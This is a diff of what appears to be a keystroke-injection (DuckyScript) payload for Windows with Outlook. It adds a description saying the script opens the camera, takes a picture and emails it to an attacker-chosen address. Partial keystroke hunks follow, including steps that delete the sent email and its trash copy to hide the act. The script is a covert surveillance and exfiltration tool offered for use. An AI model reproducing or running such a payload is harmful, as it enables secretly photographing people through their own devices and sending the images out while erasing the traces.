@@ -3,7 +3,7 @@ REM Author: Kavitate
 REM Target: Win 10+ Utilizing Microsoft Outlook
 REM Version: 1.0
 REM Category: Recon
-
+REM Description: Opens the device camera, takes a picture, and emails the picture to the user-defined email address utilizing Microsoft Outlook.
 REM OPENS THE CAMERA.
 CONTROL ESCAPE
 DEFAULTDELAY 950
@@ -13,7 +13,6 @@ DELAY 1500
 ENTER
 ALT SPACE
 STRING C
-
 REM OPENS EMAIL.
 CONTROL ESCAPE
 STRING Email
@@ -51,7 +50,6 @@ ENTER
 DELAY 3000
 ALT S
 DELAY 3000
-
 REM DELETES SENT EMAIL AND SENT EMAIL IN TRASH AND RETURNS THE INTERFACE BACK TO THE INBOX.
 CTRL Y
 DOWN ARROW
